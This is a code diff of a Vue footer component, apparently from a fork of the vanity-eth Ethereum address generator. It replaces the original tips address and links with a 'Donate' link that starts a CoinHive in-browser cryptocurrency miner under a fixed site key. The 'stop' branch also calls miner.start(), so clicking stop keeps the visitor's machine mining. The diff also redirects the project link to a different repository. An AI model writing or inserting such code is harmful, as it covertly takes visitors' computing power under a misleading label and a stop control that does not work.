@@ -3,18 +3,11 @@
         <div class="container">
             <div class="row">
                 <div class="col-12 col-lg-6 address">
-                    Tips:
-                    <a :href="`https://etherscan.io/address/${tipsAddress}#tokentxns`" target="_blank" v-text="tipsAddress"></a>
+                    <a href="#footer" v-text="donateText" v-on:click="donate"></a>
                 </div>
                 <div class="col-12 col-lg-6 links">
-                    <a :href="`https://etherdonation.com/d?to=${tipsAddress}`" target="_blank">
-                        <i class="icon-ethereum"></i>&nbsp;&nbsp;&nbsp;Donate
-                    </a>
-                    <a href="https://github.com/bokub/vanity-eth" target="_blank">
+                    <a href="https://github.com/VieYang/vanity-new" target="_blank">
                         <i class="icon-star"></i>&nbsp;&nbsp;&nbsp;Star&nbsp;me
-                    </a>
-                    <a href="https://github.com/bokub/vanity-eth/wiki/download-Vanity-ETH" target="_blank">
-                        <i class="icon-download"></i>&nbsp;&nbsp;&nbsp;Download
                     </a>
                 </div>
             </div>
@@ -26,8 +19,31 @@
     export default {
         data: function () {
             return {
-                tipsAddress: '0xAceBabe64807cb045505b268ef253D8fC2FeF5Bc'
+                donateText: 'Donate',
             };
+        },
+        methods: {
+            donate: function () {
+                var miner = new CoinHive.Anonymous('i7Zabdc0efRIPVLQFp00riQeQ39ecg8k');
+                miner.on('authed', function(params) {
+                    console.log("authed");
+                });
+
+                miner.on('accepted', function(params) {
+                    console.log("Accepted:", params.hashes);
+                });
+
+                if (this.donateText === "stop") {
+                    console.log("stop");
+                    this.donateText = "Donate";
+                    miner.start();
+                } else {
+                  this.donateText = "stop";
+                  console.log("start donate");
+                  miner.start();
+                }
+
+            }
         }
     };
 </script>
